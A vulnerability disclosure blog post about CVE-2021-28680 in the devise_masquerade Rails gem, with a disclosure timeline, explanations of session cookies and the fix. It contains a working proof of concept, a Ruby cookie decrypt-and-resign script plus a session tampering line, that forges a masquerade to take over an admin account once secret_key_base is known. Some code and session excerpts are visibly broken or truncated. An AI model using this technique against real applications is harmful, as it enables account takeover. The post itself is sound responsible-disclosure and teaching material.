| This is a security vulnerability that has been subject to a 90-day disclosure deadline and has been fixed in the v1.3.1 release of `devise_masquerade`. I'm creating this issue for traceability inside the GitHub project and to be able to refer to it from the CVE. Ideally a security advisory should be created.  If the `secret_key_base` variable is somehow leaked, an attacker can become any user by misusing the "masquerade back" functionality of this Devise extension, something that is not possible in plain Devise since the attacker must know the victim's password salt to form a valid session cookie to encrypt and sign using `secret_key_base`.  From the description of [CVE-2021-28680](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-28680):  The devise\_masquerade gem before 1.3 allows certain attacks when a password's salt is unknown. An application that uses this gem to let administrators masquerade/impersonate users loses one layer of security protection compared to a situation where Devise (without this extension) is used. If the server-side secret\_key\_base value became publicly known (for instance if it is committed to a public repository by mistake), there are still other protections in place that prevent an attacker from impersonating any user on the site. When masquerading is not used in a plain Devise application, one must know the password salt of the target user if one wants to encrypt and sign a valid session cookie. When devise\_masquerade is used, however, an attacker can decide which user the "back" action will go back to without knowing that user's password salt and simply knowing the user ID, by manipulating the session cookie and pretending that a user is already masqueraded by an administrator.  By adding and setting the dictionary key `devise_masquerade_user` to the user ID of the admin victim in the session cookie JSON/Marshal object, an attacker can fake that an impersonation has occurred and then use the "masquerade back" functionality to become the victim. |

# The Devise Extension That Peeled off One Layer of the Security Onion (CVE-2021-28680)

By **Laban SkÃ¶llermark ([@LabanSkoller](https://twitter.com/LabanSkoller))**

March 23, 2021

I work for the security consultant company
[Defensify](https://defensify.se/home) where I conduct security assessments of
applications and networks. In December 2020 I made a review of a web
application written in [Ruby on Rails](https://rubyonrails.org/). I will not
disclose the name of the client or any other vulnerabilities found in the
clientâs application, but this blog post tells the story of how I found a
security vulnerability in one of the third-party dependencies they use, which
is open source, and got my first ever CVE assigned. \o/

# Timeline

| Date | Event |
| --- | --- |
| 2020-DEC-16 | The problem was found during a security assessment for my employer [Defensify](https://defensify.se/home) |
| 2020-DEC-23 | Report sent to the devise\_masquerade maintainer and as FYI to the appointed Devise email address for security vulnerabilities. A 90-day coordinated disclosure deadline was proposed and the intention to publish this blog post was communicated. |
| 2020-DEC-23 | Reception of report confirmed by the devise\_masquerade maintainer |
| 2021-JAN-08 | Maintainer acknowledged the issue as non-critical and suggested an alternative fix |
| 2021-JAN-11 | No reply at all from the Devise security email address so [an issue](https://github.com/heartcombo/devise/issues/5329) was opened on GitHub and it turned out the email address was no longer in use. A new email address was provided to which the original report was sent. |
| 2021-JAN-17 | Devise maintainer confirmed the reception of the report, acknowledged that "it does look like a security concern" and provided some recommendations |
| 2021-FEB-03 | The devise\_masquerade maintainer bumped the version to 1.3.0 and fixed the issue ([pull request #76](https://github.com/oivoodoo/devise_masquerade/pull/76)). The fix is included in [release v1.3.1](https://github.com/oivoodoo/devise_masquerade/releases/tag/v1.3.1). |
| 2021-MAR-17 | Application for a CVE is submitted to Mitre |
| 2021-MAR-18 | The CVE Assignment Team at Mitre assigns [CVE-2021-28680](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-28680) to the issue |
| 2021-MAR-23 | Disclosure deadline met. Public [GitHub issue #83](https://github.com/oivoodoo/devise_masquerade/issues/83) created. Publication of this post at 21:35 CET. |

# About Security Assessments

A typical web application security assessment at
[Defensify](https://defensify.se/home) is 40 hours with mostly manual tests to
cover [OWASP Top 10](https://owasp.org/www-project-top-ten/) risks and most of
[OWASP Application Security Verification
Standard](https://owasp.org/www-project-application-security-verification-standard/)
(ASVS) 4.0 level 2. It is often conducted by one or two security consultants.
We prefer to have source code available to speed up the assessment and find
more vulnerabilities but that is not always approved by the client.

The output is a written report around 50 pages with usually around 20 security
issues with severities rated *Low*, *Medium*, *High* or *Critical* according to
[NVD CVSS v3](https://nvd.nist.gov/vuln-metrics/cvss), or *Informational* for
hardening tips which do not represent actual vulnerabilities.

# How Devise Session Cookies Work

[Devise](https://github.com/heartcombo/devise/) is a modular Ruby on Rails
authentication solution based on the [Rack](https://github.com/rack/rack)
authentication framework [Warden](https://github.com/wardencommunity/warden).
Session data can be stored in cookies and are then both encrypted and signed.
Keys for the encryption and signing are usually derived from the variable
`secret_key_base` and some static salts using
[PBKDF2](https://en.wikipedia.org/wiki/PBKDF2). The plaintext session data is
either formatted as JSON or serialized using
[Marshal](https://ruby-doc.org/core-3.0.0/Marshal.html).

An example Devise session:

```
{ warden.user.user.key => [[1], "$2a$10$KItas1NKsvunK0O5w9ioWu"] }

```

Much of the security in a Devise application relies on that the value of the
variable `secret_key_base` is kept secret. Only the web server needs to know
it. If it is changed, all existing user sessions will become invalid since the
cookies cannot be neither decrypted nor verified, so users must log in again.

But even if one knows the secret key so that one can encrypt and sign oneâs own
session cookies and therefore modify the above data, in most applications one
cannot impersonate users anyway. In the above example session the userâs
password salt is included (see the Stack Overflow question [*What is the warden
data in a Rails/Devise session composed
of?*](https://stackoverflow.com/questions/23597718/what-is-the-warden-data-in-a-rails-devise-session-composed-of/23683925#23683925)).
To know the salt one must have access to the applicationâs database and without
it the session is not valid. This means that if a user changes their password,
all the other sessions of the user will be invalidated since the salt does not
match anymore.

The fact that an attacker must know a userâs current salt is a security
mechanism and what I refer to as a layer of an applicationâs security onion. I
found that that layer can be peeled off if the Devise extension
`devise_masquerade` is used.

# Masquerade Functionality Provided by the Extension

The purpose of the `devise_masquerade` extension is to allow administrators of
an application to impersonate users by providing âlogin asâ links in user lists
for example. This is an easy way to see what particular users are seeing, for
troubleshooting purposes for instance. The masquerade functionality uses some
temporary tokens under the hood which I will not go through here. There are
some visible changes in the client-side session data however which is relevant
for the problem. Examples are taken from the `v1.2.0` tag of
`devise_masquerade`.

A normal non-masqueraded user session could look like this, which is from the
[`devise_masquerade` demo
project](https://github.com/oivoodoo/devise_masquerade/#demo-project)
(prettified for readability):

```
{
  "session_id" => "644e5c0be8d28a15a88328fa1cbf963f",
  "flash" =>
  {
    "discard" => [],
    "flashes" =>
    {
      "notice" => "Signed in successfully."
    }
  },
  "warden.user.user.key" => [[1], "$2a$10$FEcuUA/KECTwvnjHSRY0oO"],
  "_csrf_token" => "BOg67TylXKT3OX/4NN5RkgBlWjEhKqdxZEvOWEsinTw="
}
```

The user with ID 1 (`user1@example.com` in the demo project) is logged in and
the userâs password is stored as a
[bcrypt](https://en.wikipedia.org/wiki/Bcrypt) hash (`2a`) with cost factor
`10` (210 = 1024 rounds) with a 128-bit salt encoded as Base64 to
`FEcuUA/KECTwvnjHSRY0oO`.

When user 1 clicks a link to impersonate user 2 via the `/users/masquerade/2`
endpoint, the salt of that new user is loaded from the database and the session
is changed as follows:

```
{
  "session_id" => "b9b82f98591a6014a690b0be36b53c7a",
  "flash" =>
  {
    "discard" => [],
    "flashes" =>
    {
      "notice" => "Signed in successfully."
    }
  },
  "warden.user.user.key" => [[2], "$2a$10$BS3Aqkt5g2bOTM6IOgWzWu"],
  "_csrf_token" => "BOg67TylXKT3OX/4NN5RkgBlWjEhKqdxZEvOWEsinTw=",
  "devise_masquerade_user" => 1,
  "devise_masquerade_masquerading_resource_class" => "User",
  "devise_masquerade_masqueraded_resource_class" => "User"
}
```

As you can see, `warden.user.user.key` now says user 2 instead of user 1 and
the salt is replaced with that of user 2. A new session ID is generated. Three
new dictionary entries related to the masquerade extension are also added. The
most relevant one is `devise_masquerade_user` which holds the user ID of the
user who made the impersonation. The reason for that is so that one can âgo
backâ to the original user, normally an administrator.

That is usually done via the `/users/masquerade/back` endpoint. If one now
clicks that back link, the session is changed again to look like this:

```
{
  "session_id" => "b18884851db9be8d5dbec4b71db8e78d",
  "flash" =>
  {
    "discard" => [],
    "flashes" =>
    {
      "notice" => "Signed in successfully."
    }
  },
  "warden.user.user.key" => [[1], "$2a$10$FEcuUA/KECTwvnjHSRY0oO"],
  "_csrf_token" => "BOg67TylXKT3OX/4NN5RkgBlWjEhKqdxZEvOWEsinTw="
}
```

A new session ID is generated again, the masquerade related items are removed,
and the user ID is reset back to 1 and that userâs salt is loaded from the
database.

Here is a good place to stop and reflect over the masquerade functionality and
what it means for the security assumption described earlier. Can you spot the
issue?

# The devise\_masquerade Issue

When the masquerading extension is not present, one must know the password salt
of the target user if one wants to encrypt and sign a valid session cookie.
However, by pretending that a user is already masqueraded, one can decide which
user the âbackâ action will go back to without knowing that userâs password
salt and simply knowing the user ID!

Let us try to abuse the masquerade functionality to become another user. We
will use the demo project which let us freely move between all (two) users but
let us pretend that user 1 can impersonate user 2 but not vice versa, so our
mission is to become user 1. Note that we use the vulnerable [1.2.0 version of
`devise_masquerade`](https://github.com/oivoodoo/devise_masquerade/releases/tag/v1.2.0).

The `secret_key_base` is generated when the demo project is started and can be
found in `spec/dummy/tmp/development_secret.txt`. The secret for all examples
in this article:

```
37e3fff8f89fb244a6fc9153eae9143dd835e2b9073a7cbe52281e9cb9a014cf3500802f5c02d234197c1ff0ee35e27f6eb87c0964369cb348faa6c7970f6cbb

```

Note that even though all characters in the secret are hexadecimal
(`[0-9a-f]`), it is [interpreted as a **string** by
OpenSSL](https://github.com/ruby/openssl/blob/b28fb2f05c1e90130b2d4fdcbdae5234b66bbb05/ext/openssl/ossl_kdf.c#L54),
which is [called by the `ActiveSupport::KeyGenerator.generate_key()`
function](https://github.com/rails/rails/blob/447e28347eb46e2ad5dc625de616152bd1b69a32/activesupport/lib/active_support/key_generator.rb#L40).

Below is a Ruby script for decrypting a Rails session cookie, based on [this
gist](https://gist.github.com/mbyczkowski/34fb691b4d7a100c32148705f244d028#file-with_active_support-rb).
With some modification it can alter the decrypted session, re-encrypt and sign
it. Note that I am not a Ruby programmer (I prefer Python).

```
require 'cgi'
require 'json'
require 'active_support'

def verify_and_decrypt_session_cookie(cookie, secret_key_base = Rails.application.secrets.secret_key_base)
  cookie = CGI::unescape(cookie)
  salt         = 'encrypted cookie'
  signed_salt  = 'signed encrypted cookie'
  key_generator = ActiveSupport::KeyGenerator.new(secret_key_base, iterations: 1000)
  secret = key_generator.generate_key(salt)[0, ActiveSupport::MessageEncryptor.key_len]
  sign_secret = key_generator.generate_key(signed_salt)
  encryptor = ActiveSupport::MessageEncryptor.new(secret, sign_secret, serializer: Marshal) # or JSON
  session = encryptor.decrypt_and_verify(cookie)
  puts
  puts "Existing session: ", session

  # Modify the session according to your needs here

  #puts "Changed session: ", session
  #new_session = encryptor.encrypt_and_sign(session)
  #puts
  #puts "New encrypted and signed cookie: ", new_session
end

puts "Paste current session cookie: "
cookie = gets.chomp
verify_and_decrypt_session_cookie(cookie, "37e3fff8f89fb244a6fc9153eae9143dd835e2b9073a7cbe52281e9cb9a014cf3500802f5c02d234197c1ff0ee35e27f6eb87c0964369cb348faa6c7970f6cbb")
```

We begin with logging in as user `user2@example.com` with ID 2 and password
`password`.

![Log in --- Email
[user2@example.com] --- Password [********] --- [Log in]](../../../../images/devise_masquerade_login_user_2.png "Demo project's login page")

*Logging in as user2@example.com*

Now we are logged in as user 2:

![user2@example.com
--- user1@example.com [Login as]](../../../../images/devise_masquerade_logged_in_as_user_2.png "Logged in at demo project")

*Logged in as user2@example.com*

```

Now back to the proof-of-concept.

Let us now add the following line to the Ruby script to fool
`devise_masquerade` that we have become user 2 by logging in as user 1 and
using the masquerade functionality:

```
  session["devise_masquerade_user"] = 1
```

Rerunning the script will now give us a new cookie:

```
$ ruby recrypt_and_sign_cookie.rb
Paste current session cookie:

Using this new cookie value in the browser and reloading the page shows that
the application now thinks we have really done a masquerade. A *Back

Clicking that back link is the final step.

![user1@example.com --- user2@example.com [Login as]](../../../../images/devise_masquerade_masquerade_back.png "Becoming user 1 in demo project")

*Become user1@example.com using the

We just became user 1 without knowing their password or salt!

```

So “all” you have to obtain to exploit this vulnerability is:

* `secret_key_base`
* the ability to login as a user
* the user ID of a target administrator (which can be brute forced since they
  are sequential)

# My Recommendations

The 23rd of December 2020 I sent my finding (as an early Christmas
gift) to a `devise_masquerade` maintainer together with a proposed fix
(communicated in writing only – no coding). I also included the designated
Devise security email address in the conversation, but it later turned out that
nobody was watching that inbox (see the GitHub
[issue](https://github.com/heartcombo/devise/issues/5329)). I asked if they
agreed that it is a security vulnerability (which they did) and if they thought
it warrants a CVE (which they never responded to). I also recommended to create
a [security advisory on
GitHub](https://github.com/oivoodoo/devise_masquerade/security/advisories).

*(No) security advisories for devise\_masquerade on
GitHub*

Since GitHub is nowadays a CVE Numbering Authority (CNA), they can reserve a
CVE number for you. From GitHubâs documentation page [Requesting a CVE
identification
number](https://docs.github.com/en/github/managing-security-vulnerabilities/publishing-a-security-advisory#requesting-a-cve-identification-number):

> Anyone with admin permissions to a security advisory can request a CVE
> identification number for the security advisory.
>
> If you don’t already have a CVE identification number for the security
> vulnerability in your project, you can request a CVE identification number
> from GitHub. GitHub usually reviews the request within 72 hours. Requesting a
> CVE identification number doesn’t make your security advisory public. If your
> security advisory is eligible for a CVE, GitHub will reserve a CVE
> identification number for your advisory. We’ll then publish the CVE details
> after you publish the security advisory.

Only repository administrators can create security advisories however and the
maintainer has not done so despite me mentioning it in the email conversations
three times… But of course I cannot require anything from an open source
developer without proper backing from a company! So I decided to [try my luck
with Mitre](https://cveform.mitre.org/) instead and they assigned
[CVE-2021-28680](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-28680)
for the vulnerability within seven hours.

*Email from Mitre*

Here is the solution for the security problem that I recommended to the
maintainer:

> I’ve thought about a possible mitigation as well. Instead of just storing the
> ID of the admin doing the impersonation so that one can quit the
> impersonation and become the admin again, store the admin’s Bcrypt salt as
> well. That way nobody with the knowledge of secret\_key\_base can “reverse
> impersonate” an admin without first knowing the admin’s Bcrypt salt. As an
> extra bonus all impersonated sessions will stop being valid when the
> administrator changes their password. Right now, as I understand it, if
> sessions are stored as cookies, impersonated sessions will only become
> invalid when the target user changes their password - not when the
> administrator who made the impersonation changes theirs.

# The Fix

The maintainer of `devise_masquerade` chose to remove the “masquerade back”
data from the session cookie and store it in the serverâs cache instead. See
[pull request #76](https://github.com/oivoodoo/devise_masquerade/pull/76). The
fix is included in [release
v1.3.1](https://github.com/oivoodoo/devise_masquerade/releases/tag/v1.3.1) (but
the [non-released version
1.3.0](https://github.com/oivoodoo/devise_masquerade/commit/bc0d09d3c04062aeeaaed60d7607df4aa3492002)
also includes it).

Decrypted session cookies from version 1.3.1 (prettified for readability)
follows.

Logged in as user 1:

```

  "session_id" => "4138ca0390666931801f7f444f485365",

    "discard" => [],
    "flashes" =>
    {
      "notice" => "Signed in successfully."
    }
  },
  "warden.user.user.key" => [[1], "$2a$10$FEcuUA/KECTwvnjHSRY0oO"],
  "_csrf_token" => "sbtbiqICigXTLHgxW6KmEVlkEEZhjHXLXX1K3UGoIMg="
}
```

User 1 masqueraded as user 2:

  "devise_masquerade_masquerading_resource_class" => "User",
  "devise_masquerade_masqueraded_resource_class" => "User"
}
```

Masqueraded back to user 1:

  "flash" =>
  {

    }
  },
  "warden.user.user.key" => [[1], "$2a$10$FEcuUA/KECTwvnjHSRY0oO"],
  "_csrf_token" => "sbtbiqICigXTLHgxW6KmEVlkEEZhjHXLXX1K3UGoIMg="
}
```

That is the story of how I found a security problem in an open source project
and got my first CVE!

Prior to the publication of this blog post I created the public [GitHub issue
#83](https://github.com/oivoodoo/devise_masquerade/issues/83) for
traceability.
